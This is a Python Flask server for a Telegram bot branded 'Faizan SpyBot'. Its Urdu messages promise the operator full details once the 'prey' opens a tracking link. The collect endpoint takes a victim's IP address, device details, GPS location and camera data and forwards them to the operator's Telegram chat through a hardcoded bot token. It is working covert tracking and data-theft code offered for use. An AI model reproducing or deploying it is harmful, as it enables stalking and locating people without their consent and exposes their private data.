from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    data = request.json
    if "message" in data:
        text = data["message"].get("text", "")
        chat_id = data["message"]["chat"]["id"]

        if text == "/start":
            welcome_msg = (
                "🎯 *Faizan™ SpyBot Activated!*\n\n"
                "🌐 آپ کا ذاتی ٹریکر سسٹم کامیابی سے چل پڑا ہے۔\n\n"
                "🔗 *ٹریکنگ لنک:* [Click Here](https://faizan-spybot.onrender.com)\n\n"
                "📡 جیسے ہی شکار لنک کھولے گا، آپ کو مکمل معلومات ملے گی!"
            )
            requests.post(f"{API_URL}/sendMessage", data={
                "chat_id": chat_id,
                "text": welcome_msg,
                "parse_mode": "Markdown"
            })
    return jsonify({"ok": True})

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    ip = request.remote_addr
    user_agent = data.get("userAgent", "Unknown")
    lat = data.get("latitude", None)
    lon = data.get("longitude", None)
    camera = data.get("camera", "❌ Unknown")
    device_info = data.get("deviceInfo", "Unknown")

    location_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "❌ Location Not Available"

    message = (
        "👁️ *شکار آیا!*\n"
        f"🌐 *IP Address:* {ip}\n"
        f"📱 *Device Info:* {user_agent}\n"
        f"📍 *Location:* {location_link}\n"
        f"📷 *Camera:* {camera}\n"
        f"🧠 *Raw Data:* {data}"
    )

    requests.post(f"{API_URL}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    })
    return jsonify({"status": "received"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
